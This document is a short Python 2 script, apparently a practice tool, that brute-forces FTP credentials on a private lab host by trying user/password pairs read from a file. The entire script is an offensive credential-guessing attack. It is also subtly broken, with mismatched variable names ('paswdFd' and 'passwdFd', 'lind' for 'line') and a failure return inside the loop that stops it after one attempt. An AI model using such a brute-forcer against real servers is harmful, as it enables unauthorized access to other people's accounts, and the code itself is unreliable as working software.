#!/usr/bin/python
# -*- coding: utf-8 -*-
import ftplib, time

def bruteLogger(hostName,passwdFile):
	paswdFd = open(passwdFile, 'r')
	for line in passwdFd.readlines():
		time.sleep(2)
		userName = line.split(':')[0]
		passWord = lind.split(':')[1].strip('\r').strip('\n')
		print '[*]Trying '+userName+"/"+passWord

		try:
			ftp =ftplib.FTP(hostName)
			ftp.login(userName,passWord)
			print '\n[*]' +str(hostName)+'FTP Login succeded'
			ftp.quit()
			return(userName,passWord)

		except Exception, e:
			pass

		print '\nCould not brute force the server FTP creds'
		return(None,None)



host = '192.168.56.102'
passwdFile = "****************"
bruteLogger(host,passwdFile)